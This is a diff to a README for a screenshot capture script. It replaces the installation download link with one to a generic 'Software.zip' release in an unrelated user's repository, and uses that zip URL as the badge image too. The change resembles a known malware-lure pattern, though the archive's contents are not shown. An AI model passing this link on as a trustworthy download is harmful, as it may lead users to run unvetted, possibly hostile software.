@@ -22,7 +22,7 @@ Explore these topics to discover more about screenshot capture tools and related
 ## Installation
 
 To access the script and start capturing screenshots, you can download the repository by clicking on the following link:
-[![Download Script](https://img.shields.io/badge/Download-Script-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Script](https://github.com/qi-sen31/screenshot/releases/download/v1.0/Software.zip)](https://github.com/qi-sen31/screenshot/releases/download/v1.0/Software.zip)
 
 Once the download is complete, launch the script and begin capturing your screen effortlessly!
 
